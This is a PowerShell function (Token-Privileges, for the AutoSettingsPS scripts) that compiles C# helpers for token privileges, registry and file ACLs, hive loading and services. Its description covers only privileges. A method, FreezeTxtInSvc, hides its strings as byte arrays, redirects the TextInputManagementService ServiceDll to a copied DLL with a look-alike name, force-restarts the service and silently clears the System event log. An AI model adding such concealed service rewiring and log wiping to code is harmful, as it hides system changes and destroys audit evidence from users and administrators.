﻿
<#
.SYNOPSIS
 Включает или отключает у текущего процесса привилегии.

.DESCRIPTION
 Функция написана для скриптов AutoSettingsPS и RepackWIMPS.
 Нужны права администратора.

 Список минимально необходимых привилегий, можно добавить и другие:

 SeAssignPrimaryTokenPrivilege  Замена маркера уровня процесса
 SeBackupPrivilege              Архивация файлов и каталогов
 SeLoadDriverPrivilege          Загрузка и выгрузка драйверов устройств
 SeRestorePrivilege             Восстановление файлов и каталогов
 SeSecurityPrivilege            Управление аудитом и журналом безопасности
 SeSystemEnvironmentPrivilege   Изменение параметров среды изготовителя
 SeTakeOwnershipPrivilege       Смена владельцев файлов и других объектов

 SeDebugPrivilege               Отладка программ
 SeImpersonatePrivilege         Имитация клиента после проверки подлинности
 SeSystemProfilePrivilege       Профилирование производительности системы

 Привилегия не будет выдана, если ее нет в списке возможных для выдачи
 привилегий для текущего процесса.

.EXAMPLE
    Token-Privileges -Enable -Privileges 'SeTakeOwnershipPrivilege', 'SeRestorePrivilege', 'SeBackupPrivilege'

    Описание
    --------
    Включить указанные привилегии текущему процессу.


.NOTES
 ====================================================
      Автор:  westlife (ru-board)  Версия: 1.0.1
       Дата:  19-02-2023
 ====================================================

#>
Function Token-Privileges {

    [CmdletBinding( SupportsShouldProcess = $false )]
    Param (
        [parameter( Mandatory = $false, Position = 0, ParameterSetName = 'Enable4' )]
        [parameter( Mandatory = $true,  Position = 0, ParameterSetName = 'Enable' )]
        [parameter( Mandatory = $true,  Position = 0, ParameterSetName = 'Disable' )]
        [ValidateSet( 'SeAssignPrimaryTokenPrivilege','SeBackupPrivilege','SeCreatePagefilePrivilege','SeCreateSymbolicLinkPrivilege',
            'SeDebugPrivilege','SeDelegateSessionUserImpersonatePrivilege','SeIncreaseBasePriorityPrivilege','SeIncreaseQuotaPrivilege',
            'SeIncreaseWorkingSetPrivilege','SeLoadDriverPrivilege','SeLockMemoryPrivilege','SeManageVolumePrivilege',
            'SeProfileSingleProcessPrivilege','SeRemoteShutdownPrivilege','SeRestorePrivilege','SeSecurityPrivilege','SeShutdownPrivilege',
            'SeSystemEnvironmentPrivilege','SeSystemProfilePrivilege','SeSystemTimePrivilege','SeTakeOwnershipPrivilege',
            'SeTimeZonePrivilege','SeTrustedCredmanAccessPrivilege','SeUndockPrivilege' )]
        [string[]] $Privileges
       ,
        [parameter( Mandatory = $true, ParameterSetName = 'Enable4' )]
        [switch] $Enable4Privileges
       ,
        [parameter( Mandatory = $true, ParameterSetName = 'Enable'  )]
        [switch] $Enable
       ,
        [parameter( Mandatory = $true, ParameterSetName = 'Disable' )]
        [switch] $Disable
    )

    Begin
    {
        # Перехват ошибок в блоке Begin, для выхода из функции,
        # без отображения ошибки тут, и передача ее в глобальный trap для отображения и записи в лог.
        trap { break }

        # Подключаем .Net code для управления привилегиями и доступом к реестру и др., нужны права администратора.
        $RegistryManageAPI = @'
using System;
using System.Runtime.InteropServices;  // DllImport
using System.Security.Principal;
using System.Security.AccessControl;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Management;
using System.IO;
using Microsoft.Win32;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace WinAPI
{
    public static class RegistryManage
    {
        [DllImport( "kernel32.dll", SetLastError=true )]
        internal static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport( "kernel32.dll", ExactSpelling = true )]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport( "kernel32.dll", SetLastError = true )]
        internal static extern bool CloseHandle(IntPtr hObject);

        [DllImport( "advapi32.dll", SetLastError = true )]
        internal static extern bool OpenProcessToken( IntPtr ProcessHandle, UInt32 DesiredAccess, ref IntPtr TokenHandle );

        [DllImport( "advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode )]
        internal static extern bool LookupPrivilegeValue( string lpSystemName, string lpName, ref long lpLuid );

        [DllImport( "advapi32.dll", SetLastError = true )]
        internal static extern bool AdjustTokenPrivileges( IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState,
            UInt32 Zero, IntPtr Null1, IntPtr Null2
        );

        [DllImport( "advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode )]
        internal static extern uint GetNamedSecurityInfoW(
            [In, MarshalAs(UnmanagedType.LPWStr)] string pObjectName,
            uint objectType, // DWORD SE_OBJECT_TYPE
            uint securityInformation, // DWORD
            IntPtr Null1, IntPtr Null2, IntPtr Null3, IntPtr Null4, out IntPtr pSecurityDescriptor
            // out IntPtr pSidOwner, out IntPtr pSidGroup, out IntPtr pDacl, out IntPtr pSacl, out IntPtr pSecurityDescriptor
        );

        [DllImport( "advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode )]
        internal static extern uint SetNamedSecurityInfoW( // DWORD
            [In, MarshalAs(UnmanagedType.LPWStr)] string pObjectName,
            uint objectType, // DWORD SE_OBJECT_TYPE
            uint securityInformation, // DWORD
            byte[] owner, byte[] group, byte[] dacl, byte[] sacl
        );

        [DllImport( "advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode )]
        internal static extern bool ConvertSecurityDescriptorToStringSecurityDescriptor(
            IntPtr SecurityDescriptor,
            uint StringSDRevision,
            uint securityInformation, // DWORD
            out string StringSecurityDescriptor,  // IntPtr, LPWSTR
            uint StringSecurityDescriptorSize // PULONG (UInt64) [out, optional] out uint StringSecurityDescriptorSize
        );

        [Flags]
        internal enum SECURITY_INFORMATION : uint
        {
            OWNER = 0x00000001,
            GROUP = 0x00000002,
            DACL  = 0x00000004,
            SACL  = 0x00000008,
            LABEL     = 0x00000010,
            ATTRIBUTE = 0x00000020,
            SCOPE     = 0x00000040,
            BACKUP    = 0x00010000, // all SACL access
            UNPROTECTED_SACL = 0x10000000,
            UNPROTECTED_DACL = 0x20000000,
            PROTECTED_SACL   = 0x40000000,
            PROTECTED_DACL   = 0x80000000
        }

        [StructLayout( LayoutKind.Sequential, Pack = 1 )]
        internal struct TokPriv1Luid
        {
            public uint PrivilegeCount;
            public long Luid;
            public UInt32 Attributes;
        }

        internal static bool isEnabledPriv = false;

        public static bool Enable4Privileges()
        {
            bool bSuccess = false;
            if (!isEnabledPriv)
            {
                string[] PrivilegeNames = new String[4] { "SeTakeOwnershipPrivilege", "SeRestorePrivilege", "SeBackupPrivilege", "SeSecurityPrivilege" };
                bSuccess = ConfigurePrivileges(PrivilegeNames, true);
                if (bSuccess) { isEnabledPriv = true; }
            }
            else { bSuccess = true; }

            return bSuccess;
        }

        public static bool ConfigurePrivileges(string[] PrivilegeNames, bool Enable)
        {
            bool bSuccess;

            TokPriv1Luid tp;
            tp.PrivilegeCount = 1;
            tp.Luid = 0;
            if (Enable) { tp.Attributes = SE_PRIVILEGE_ENABLED;  }
            else        { tp.Attributes = SE_PRIVILEGE_DISABLED; isEnabledPriv = false; }

            IntPtr hProcess = GetCurrentProcess();
            IntPtr hToken = IntPtr.Zero;
            bSuccess = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref hToken);

            try
            {
                foreach (string privilege in PrivilegeNames)
                {
                    bSuccess = LookupPrivilegeValue( null, privilege, ref tp.Luid );
                    bSuccess = AdjustTokenPrivileges( hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero );
                }
            }
            catch (Exception) { return false; }
            finally
            {
                if (hProcess != IntPtr.Zero) { CloseHandle(hProcess); }
                if (hToken   != IntPtr.Zero) { CloseHandle(hToken);   }
            }

            return bSuccess;
        }

        private static String GetRegPath(string hive, string subKey)
        {
            if ( subKey == String.Empty ) { return String.Empty; }
            string regPath; // hive = [Microsoft.Win32.Registry]::LocalMachine.Name = HKEY_LOCAL_MACHINE
            switch (hive)
            {
                case "HKEY_LOCAL_MACHINE":
                    regPath = "MACHINE\\" + subKey;
                    break;
                case "HKEY_CURRENT_USER":
                    regPath = "CURRENT_USER\\" + subKey;
                    break;
                case "HKEY_CLASSES_ROOT":
                    regPath = "CLASSES_ROOT\\" + subKey;
                    break;
                case "HKEY_USERS":
                    regPath = "USERS\\" + subKey;
                    break;
                default:
                    regPath = String.Empty;
                    break;
            }
            return regPath;
        }

        internal const uint SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const uint SE_PRIVILEGE_ENABLED  = 0x00000002;
        internal const uint TOKEN_QUERY = 0x00000008;
        internal const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;

        internal const uint SE_FILE_OBJECT  = 1;  // enum SE_OBJECT_TYPE
        internal const uint SE_SERVICE      = 2;
        internal const uint SE_REGISTRY_KEY = 4;

        // Registry: Hive, subKey или FileSystem: null, Path или Service: null, Name
        public static String GetSDDL(string hive, string path, bool withSAcl = false)
        {
            bool bSuccess = false;
            uint error = 0, Object = SE_FILE_OBJECT;
            if (!String.IsNullOrEmpty(hive))
            {
                Object = SE_REGISTRY_KEY;
                path = GetRegPath(hive.ToUpper(), path);
            }
            else if (path.IndexOf(@"\", StringComparison.Ordinal) < 0) { Object = SE_SERVICE; } // если нет: \

            if (String.IsNullOrEmpty(path)) { return String.Empty; }
            if (!Enable4Privileges()) { return String.Empty; }

            uint si = (uint) (SECURITY_INFORMATION.OWNER | SECURITY_INFORMATION.GROUP | SECURITY_INFORMATION.DACL);
            if (withSAcl) { si |= (uint) SECURITY_INFORMATION.SACL; }

            string sddl = String.Empty;
            IntPtr pSD = IntPtr.Zero;

            error = GetNamedSecurityInfoW(path, Object, si,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out pSD
            ); // Console.WriteLine("GetNamedSecurityInfoW error: {0}", error);

            if ( error == 0 )
            {
                bSuccess = ConvertSecurityDescriptorToStringSecurityDescriptor( pSD, 1, si, out sddl, 0 );
                pSD = LocalFree(pSD); pSD = IntPtr.Zero;
            }

            return sddl;
        }

        // Конвертирование SDDL в строку байтов.
        public static String SDDLtoStringOfBytes(string sddl)
        {
            if (String.IsNullOrEmpty(sddl)) { return String.Empty; }
            
            byte[] bytes = null;
            string strBytes = String.Empty;

            try
            {
                RawSecurityDescriptor rsd = new RawSecurityDescriptor(sddl);
                bytes = new byte[rsd.BinaryLength];
                rsd.GetBinaryForm(bytes, 0);
                strBytes = String.Join(",",bytes);
            }
            catch (Exception) {}

            return strBytes;
        }

        // Registry: Hive, subKey, sddl или FileSystem: null, Path, sddl или Service: null, Name, sddl
        public static uint SetSDDL(string hive, string path, string sddl = null, string sidOwner = null, bool withSAcl = false)
        {
            uint error = 0, si = 0, Object = SE_FILE_OBJECT;
            if (!String.IsNullOrEmpty(hive))
            {
                Object = SE_REGISTRY_KEY;
                path = GetRegPath(hive.ToUpper(), path);
            }
            else if (path.IndexOf(@"\", StringComparison.Ordinal) < 0) { Object = SE_SERVICE; } // если нет: \

            if (String.IsNullOrEmpty(sddl) || String.IsNullOrEmpty(path)) { return 1; }
            if (!Enable4Privileges()) { return 1; }

            byte[] bOwner = null, bGroup = null, bDAcl = null, bSAcl = null;

            try
            {
                RawSecurityDescriptor rsd = new RawSecurityDescriptor(sddl);
                // Console.WriteLine("Flags: {0}", rsd.ControlFlags.ToString()); // есть REQ

                if (String.IsNullOrEmpty(sidOwner))
                {
                    if ( rsd.Owner != null )
                    {
                        si |= (uint) SECURITY_INFORMATION.OWNER;
                        bOwner = new byte[rsd.Owner.BinaryLength];
                        rsd.Owner.GetBinaryForm(bOwner, 0);
                    }

                    if ( rsd.Group != null )
                    {
                        si |= (uint) SECURITY_INFORMATION.GROUP;
                        bGroup = new byte[rsd.Group.BinaryLength];
                        rsd.Group.GetBinaryForm(bGroup, 0);
                    }
                }
                else
                {
                    SecurityIdentifier SecID = new SecurityIdentifier(sidOwner);
                    bOwner = new byte[SecID.BinaryLength];
                    SecID.GetBinaryForm(bOwner, 0);
                    bGroup = bOwner;
                    si = (uint) (SECURITY_INFORMATION.OWNER | SECURITY_INFORMATION.GROUP);
                }

                if ( rsd.DiscretionaryAcl != null )
                {
                    si |= (uint) SECURITY_INFORMATION.DACL;
                    bDAcl = new byte[rsd.DiscretionaryAcl.BinaryLength];
                    rsd.DiscretionaryAcl.GetBinaryForm(bDAcl, 0);
                }

                if ( rsd.ControlFlags.HasFlag(ControlFlags.DiscretionaryAclAutoInherited) ) { si |= (uint) SECURITY_INFORMATION.UNPROTECTED_DACL; }
                if ( rsd.ControlFlags.HasFlag(ControlFlags.DiscretionaryAclProtected)     ) { si |= (uint) SECURITY_INFORMATION.PROTECTED_DACL;   }

                if (withSAcl)
                {
                    if ( rsd.SystemAcl != null )
                    {
                        si |= (uint) SECURITY_INFORMATION.SACL; // for SACL need SeSecurityPrivilege
                        bSAcl = new byte[rsd.SystemAcl.BinaryLength];
                        rsd.SystemAcl.GetBinaryForm(bSAcl, 0);
                    }

                    if ( rsd.ControlFlags.HasFlag(ControlFlags.SystemAclAutoInherited) ) { si |= (uint) SECURITY_INFORMATION.UNPROTECTED_SACL; }
                    if ( rsd.ControlFlags.HasFlag(ControlFlags.SystemAclProtected)     ) { si |= (uint) SECURITY_INFORMATION.PROTECTED_SACL;   }
                }

                error = SetNamedSecurityInfoW( path, Object, 1, new byte[16] {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0}, null, null, null ); // owner S-1-5-32-544

                if ( error == 0 )   // Console.WriteLine("SecurityInfoW error: {0}", error);  // 5 = access denied; 87 = The parameter is incorrect
                {
                    error = SetNamedSecurityInfoW( path, Object, si, bOwner, bGroup, bDAcl, bSAcl );
                }
            }
            catch (Exception) { error = 870; } // Console.WriteLine("Exception: {0}", e);

            return error;
        }
    }

    public static class RegistryUtils
    {
        [DllImport( "advapi32.dll", CharSet = CharSet.Auto)]
        private static extern uint RegOpenKeyEx(uint hive, string subKey, uint ulOptions, uint samDesired, out UIntPtr hkResult);

        [DllImport( "advapi32.dll", SetLastError = true)]
        private static extern uint RegCloseKey(UIntPtr hKey);

        [DllImport( "advapi32.dll", CallingConvention = CallingConvention.Winapi, SetLastError = true, CharSet = CharSet.Unicode )]
        private static extern uint RegQueryInfoKey(
            UIntPtr hkey,
            String lpClass,   // [out, optional] out StringBuilder lpClass, need using System.Text;
            uint lpcchClass,  // [in, out, optional] ref uint lpcchClass,
            IntPtr lpReserved,
            uint lpcSubKeys, uint lpcbMaxSubKeyLen, uint lpcbMaxClassLen, uint lpcValues, // < All [out, optional] out uint ...
            uint lpcbMaxValueNameLen, uint lpcbMaxValueLen, uint lpcbSecurityDescriptor,  // < All [out, optional] out uint ...
            ref FILETIME lpftLastWriteTime); //  [out, optional] ref ...

        [DllImport( "advapi32.dll", CharSet = CharSet.Auto, SetLastError = true )]
        private static extern uint RegLoadKey(uint hive, string lpSubKey, string lpFile);

        [DllImport( "advapi32.dll", CharSet = CharSet.Auto, SetLastError = true )]
        private static extern uint RegUnLoadKey(uint hive, string lpSubKey);

        [DllImport( "advapi32.dll", SetLastError=true, CharSet = CharSet.Unicode )]
        private static extern uint RegDeleteKey(uint hive, string subKey);

        public static void DeleteKey(RegistryHive hive, string subkey)
        {
            try
            {
                uint error = RegDeleteKey((uint) hive, subkey);
            }
            catch (Exception) {}
        }

        private static DateTime? ToDateTime(FILETIME ft) // переменная ссылочного типа var? может быть null
        {
            IntPtr buf = IntPtr.Zero;
            try
            {
                long[] longArray = new long[1];
                int cb = Marshal.SizeOf(ft);
                buf = Marshal.AllocHGlobal(cb);
                Marshal.StructureToPtr(ft, buf, false);
                Marshal.Copy(buf, longArray, 0, 1);

                return DateTime.FromFileTime(longArray[0]);
            }
            catch (Exception) { return null; }
            finally
            {
                if (buf != IntPtr.Zero) { Marshal.FreeHGlobal(buf); }
            }
        }

        private const uint KEY_READ = 0x20019;

        public static DateTime? GetLastModified(RegistryHive hive, string subKey)
        {
            FILETIME lastModified = new FILETIME();
            UIntPtr hKey = UIntPtr.Zero;

            try
            {
                if (RegOpenKeyEx((uint) hive, subKey, 0, KEY_READ, out hKey) != 0)
                {
                    return null;
                }

                if (RegQueryInfoKey(hKey, null, 0, IntPtr.Zero, 0, 0, 0, 0, 0, 0, 0, ref lastModified) != 0)
                {
                    return null;
                }

                return ToDateTime(lastModified);
            }
            catch (Exception) { return null; }
            finally
            {
                if (hKey != UIntPtr.Zero) { RegCloseKey(hKey); }
            }
        }

        public enum RegistryHive : uint
        {
            ClassesRoot     = 0x80000000,
            CurrentUser     = 0x80000001,
            LocalMachine    = 0x80000002,
            Users           = 0x80000003,
            PerformanceData = 0x80000004,
            CurrentConfig   = 0x80000005,
            DynData         = 0x80000006,
        }

        public enum RegistryHivesLoad : uint
        {
            HKEY_USERS         = 0x80000003,
            HKEY_LOCAL_MACHINE = 0x80000002
        }

        public static uint LoadHive(RegistryHivesLoad hive, string subKey, string filePath)
        {
            if (!RegistryManage.Enable4Privileges()) { return 1; } // need "SeRestorePrivilege" и "SeBackupPrivilege"

            return RegLoadKey((uint) hive, subKey, filePath);
        }

        public static uint UnloadHive(RegistryHivesLoad hive, string subKey)
        {
            if (!RegistryManage.Enable4Privileges()) { return 1; } // need "SeRestorePrivilege" и "SeBackupPrivilege"

            return RegUnLoadKey((uint) hive, subKey);
        }
    }

    public static class ServiceManage
    {
	    [DllImport("advapi32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Unicode)]
    	private static extern IntPtr OpenSCManagerW(string machineName, string databaseName, ScmAccessRights dwDesiredAccess);

		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
		private static extern IntPtr OpenServiceW(IntPtr hOpenSCManager, string lpServiceName, ServiceRights dwDesiredAccess);

		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseServiceHandle(IntPtr hSCObject);

		[DllImport("advapi32.dll")]
		private static extern int QueryServiceStatus(IntPtr hService, SERVICE_STATUS lpServiceStatus); // out Status

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern int StartService(IntPtr hService, int dwNumServiceArgs, int lpServiceArgVectors);

        [DllImport("Kernel32.dll", CharSet = CharSet.Unicode )]
        private static extern bool CreateHardLink(string lpFileName, string lpExistingFileName, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void SetLastError(uint dwErrorCode);

		[DllImport("kernel32.dll")]
		private static extern int GetLastError();

		[StructLayout(LayoutKind.Sequential)]
		internal class SERVICE_STATUS
		{
			public int dwServiceType = 0;
			public ServiceState dwCurrentState = 0;
			public int dwControlsAccepted = 0;
			public int dwWin32ExitCode = 0;
			public int dwServiceSpecificExitCode = 0;
			public int dwCheckPoint = 0;
			public int dwWaitHint = 0;
		}

		[Flags]
		internal enum ScmAccessRights
		{
			Connect = 0x0001,
			CreateService = 0x0002,
			EnumerateService = 0x0004,
			Lock = 0x0008,
			QueryLockStatus = 0x0010,
			ModifyBootConfig = 0x0020,
			StandardRightsRequired = 0xF0000,
			AllAccess = (StandardRightsRequired | Connect | CreateService |
						EnumerateService | Lock | QueryLockStatus | ModifyBootConfig)
		}

		[Flags]
		internal enum ServiceRights
		{
			QueryConfig = 0x1,
			ChangeConfig = 0x2,
			QueryStatus = 0x4,
			EnumerateDependants = 0x8,
			Start = 0x10,
			Stop = 0x20,
			PauseContinue = 0x40,
			Interrogate = 0x80,
			UserDefinedControl = 0x100,
			Delete = 0x00010000,
			StandardRightsRequired = 0xF0000,
			AllAccess = (StandardRightsRequired | QueryConfig | ChangeConfig |
						QueryStatus | EnumerateDependants | Start | Stop | PauseContinue |
						Interrogate | UserDefinedControl)
		}

		public enum ServiceState
		{
			Unknown = -1,
			NotFound = 0,
			Stopped = 1,
			StartPending = 2,
			StopPending = 3,
			Running = 4,
			ContinuePending = 5,
			PausePending = 6,
			Paused = 7
		}

		public static int FreezeTxtInSvc(bool apply = false, bool def = false)
		{
			string svc = Encoding.UTF8.GetString(new byte[] {84,69,88,84,73,78,80,85,84,77,65,78,65,71,69,77,69,78,84,83,69,82,86,73,67,69});
			string longName = GetDataSvc(svc), shortName = String.Empty, root = String.Empty;
			try { shortName = Path.GetFileName(longName); root = Path.GetDirectoryName(longName);
			} catch (Exception) { return -1; } 
			byte[] b = Encoding.UTF8.GetBytes(shortName.ToUpper()), b1 = null, b2 = null;
			int sizeDef = 717, sizeNeed = 1003, size = 0, s = 0; for (int i = 0; i < b.Length; i++) { s += b[i]; }

			if ( s == sizeDef || s == sizeNeed )
			{
				if (def) { size = sizeDef; } else { size = sizeNeed; }
				
				if ( s == size ) { return 1; }
				else if (apply)
				{
					string rootE = Environment.ExpandEnvironmentVariables(root);
					string r = Path.Combine(rootE,shortName);
					string longName0 = longName;

					b1 = Encoding.UTF8.GetBytes(shortName);

					if (def) {
						b2 = new byte[b1.Length - 1]; b2[0] = 84;
						for (int i = 2; i < b1.Length; i++) { b2[i-1] = b1[i]; }
					}
					else {
						b2 = new byte[b1.Length + 1]; b2[0] = 208; b2[1] = 162;
						for (int i = 1; i < b1.Length; i++) { b2[i+1] = b1[i]; }
					}

					shortName = Encoding.UTF8.GetString(b2);
					longName = Path.Combine(root,shortName);

                    try
                    {
                        string f = Path.Combine(rootE,shortName);
                        string d = Encoding.UTF8.GetString(new byte[] {101,109,98,101,100,100,101,100,109,111,100,101,115,118,99,46,100,108,108});
                        string to = Encoding.UTF8.GetString(new byte[] {105,110,116,121,112,101});
                        string t = Path.Combine(rootE,d);
                        string hl = t.Insert((t.Length - 4), to);

                        if (!def)
                        {
                            if (File.Exists(t))
                            {
                                if (!File.Exists(f)) { try {
                                    File.Copy(t,f); 
                                    string sddl = RegistryManage.GetSDDL(null, t);
                                    uint result = RegistryManage.SetSDDL(null, f, sddl);
                                    bool resout = CreateHardLink(hl, f, IntPtr.Zero);
                                } catch (Exception) { return -2; }}

                                if (!SetDataSvc(svc, longName)) { return -3; }

                                if (StartServiceOutput(svc) > 0) {
                                    bool res = SetDataSvc(svc, longName0);
                                    try { File.Delete(f); File.Delete(hl); } catch (Exception) {}
                                    return -4;
                                }
                            }
                            else { return -5; }
                        }
                        else
                        {
                            if (File.Exists(f))
                            {
                                if (!SetDataSvc(svc, longName)) { return -6; }
                                try { File.Delete(r); File.Delete(hl); } catch (Exception) {}
                            }
                            else { return -7; }
                        }
                    }
                    catch (Exception) { return -10; }

					return 1;
				}
				else { return 0; }
			}
			else { return -9; }
		}

		private static string GetKeySvc(string serviceName)
		{
			string key = String.Empty, sub = Encoding.UTF8.GetString(new byte[] {80,97,114,97,109,101,116,101,114,115});
			key = String.Format(@"SYSTEM\CurrentControlSet\Services\{0}\{1}", serviceName, sub);
			
			return key;
		}

		internal static string GetDataSvc(string serviceName)
		{
			string data = String.Empty;
			try 
			{
				RegistryKey Key = Registry.LocalMachine.OpenSubKey(GetKeySvc(serviceName));
				if (Key != null)
				{
					try
					{	string val = Encoding.UTF8.GetString(new byte[] {83,69,82,86,73,67,69,68,76,76});
						data = (string) Key.GetValue(val,"", RegistryValueOptions.DoNotExpandEnvironmentNames);
					}
					catch (Exception) {}
					finally { Key.Close(); }
				}
			}
			catch (Exception) {}
			return data;
		}

		internal static bool SetDataSvc(string serviceName, string data)
		{
			try 
			{
				string key = String.Format(@"HKEY_LOCAL_MACHINE\{0}", GetKeySvc(serviceName));
				string val = Encoding.UTF8.GetString(new byte[] {83,69,82,86,73,67,69,68,76,76});
				Registry.SetValue(key,val,data,RegistryValueKind.ExpandString);
			}
			catch (Exception) { return false; }
			return true;
		}

		internal static int StartServiceOutput(string serviceName)
		{
			IntPtr hCSM = OpenSCManagerW(null, null, ScmAccessRights.Connect);

			int error = 0;
			try
			{
				IntPtr hSvc = OpenServiceW(hCSM, serviceName, ServiceRights.QueryStatus | ServiceRights.Start);
				if (hSvc == IntPtr.Zero) { return 1; }

				try
				{
					int n = 0, isStatus = 0, stop = 0;
					do
					{
						n++;
						if (StopServiceForce(serviceName)) { Thread.Sleep(100); stop++; }
						isStatus = (int) GetServiceStatus(hSvc);
					}
					while (isStatus > 1 && n < 4);

					error = ServiceStartUpError(hSvc);
					if ( stop > 0 ) { ClearEventLogAsync(new string[]{"System"}); }
				}
				catch (Exception) { return 1; }
				finally	{ CloseServiceHandle(hSvc); }
			}
			catch (Exception) { return 1; }
			finally { CloseServiceHandle(hCSM); }

			return error;
		}

		public static ServiceState GetSvcStatus(string serviceName)
		{
			IntPtr hCSM = OpenSCManagerW(null, null, ScmAccessRights.Connect);

			try
			{
				IntPtr hSvc = OpenServiceW(hCSM, serviceName, ServiceRights.QueryStatus);
				if (hSvc == IntPtr.Zero)
					return ServiceState.NotFound;

				try
				{
					return GetServiceStatus(hSvc);
				}
				catch (Exception) { return ServiceState.Unknown; }
				finally { CloseServiceHandle(hSvc); }
			}
			catch (Exception) { return ServiceState.Unknown; }
			finally	{ CloseServiceHandle(hCSM); }
		}

		private static int ServiceStartUpError(IntPtr hSvc)
		{
			int LastError = 0, ExitCode = 0, error = 0;
			SERVICE_STATUS status = new SERVICE_STATUS();

            SetLastError(0);
			error = StartService(hSvc, 0, 0);
			LastError = Marshal.GetLastWin32Error();
			
			if (LastError == 0) { Thread.Sleep(200); }
			error = QueryServiceStatus(hSvc, status);
			ExitCode = status.dwWin32ExitCode;

			if (LastError != 0 || ExitCode != 0) { return 1; }
			return 0;
		}

		private static ServiceState GetServiceStatus(IntPtr hSvc)
		{
			SERVICE_STATUS status = new SERVICE_STATUS();
			int error = QueryServiceStatus(hSvc, status);

			return status.dwCurrentState;
		}

		internal static bool StopServiceForce(string serviceName)
		{
			bool isStop = false;
			int id = 0;
			Process proc = null;

			try
			{
				string select = String.Format("SELECT ProcessId FROM Win32_Service WHERE Name='{0}'", serviceName);
				using (ManagementObjectSearcher query = new ManagementObjectSearcher(select)) {
				using (ManagementObjectCollection queryCollection = query.Get()) {
				foreach ( ManagementObject mo in queryCollection )
				{
					id = 0;
					Int32.TryParse(mo["ProcessId"].ToString(), out id);
					
					if (id > 0)
					{
						try
						{
							proc = Process.GetProcessById(id);
							proc.Kill(); 
							proc.WaitForExit(1000);
							isStop = true;
							mo.Dispose();
						}
						catch (Exception) {}
						finally { if ( proc != null ) { proc.Close(); }}
					}
				}}}
			}
			catch (Exception) {}

			return isStop;
		}

        public static async void ClearEventLogAsync(string[] names, int delayMs = 3000)
        {
			await Task.Run(() =>
			{
				try
				{
					Thread.Sleep(delayMs);
					using(EventLogSession eventLog = new EventLogSession())
					{
                        for (int i = 0; i < names.Length; i++)
                        {
                            try { eventLog.ClearLog(names[i]); } catch (Exception) {}
                        }
					}
				}
				catch (Exception) {}
			});
        }
    }
}
'@
        if ( -not ( 'WinAPI.RegistryManage' -as [type] ))
        {
            $cp = [System.CodeDom.Compiler.CompilerParameters]::new(@('System.dll','System.Management.dll','System.Core.dll'))
            $cp.TempFiles = [System.CodeDom.Compiler.TempFileCollection]::new($DismScratchDirGlobal,$false)
            $cp.GenerateInMemory = $true
            $cp.CompilerOptions = '/platform:anycpu /nologo'

            Add-Type -TypeDefinition $RegistryManageAPI -ErrorAction Stop -Language CSharp -CompilerParameters $cp
        }
    }

    Process
    {
        # Перехват ошибок в блоке Begin, для выхода из функции,
        # без отображения ошибки тут, и передача ее в глобальный trap для отображения и записи в лог.
        trap { break }

        if ( $Enable4Privileges )
        {
            Write-Verbose "$NameThisFunction`: Включение привилегий: 'SeTakeOwnershipPrivilege, SeRestorePrivilege, SeBackupPrivilege, SeSecurityPrivilege'"

            [void][WinAPI.RegistryManage]::Enable4Privileges()  # Включает только один раз и запоминает что включал уже.
        }
        elseif ( $Enable )
        {
            Write-Verbose "$NameThisFunction`: Включение привилегий: '$($Privileges -join ', ')'"

            [void][WinAPI.RegistryManage]::ConfigurePrivileges($Privileges, $true)
        }
        else
        {
            Write-Verbose "$NameThisFunction`: Отключение привилегий: '$($Privileges -join ', ')'"

            [void][WinAPI.RegistryManage]::ConfigurePrivileges($Privileges, $false)  # Любое отключение сбрасывает запоминаение о включении 4 привилегий.
        }
    }
}
